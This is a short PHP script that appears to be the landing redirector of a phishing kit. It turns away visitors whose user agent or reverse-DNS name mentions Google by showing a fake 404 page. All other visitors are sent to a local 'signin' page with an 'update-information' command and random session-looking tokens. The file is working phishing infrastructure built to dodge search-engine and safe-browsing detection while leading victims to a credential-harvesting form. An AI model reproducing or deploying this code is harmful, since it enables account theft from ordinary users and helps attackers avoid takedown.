<?php
session_start();
error_reporting(0);
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
$A = "./signin/signin.php?cmd=_update-information&account_update=" . md5(microtime()) . "&lim_session=" . sha1(microtime()) . "";
HEADER("location:$A");
?>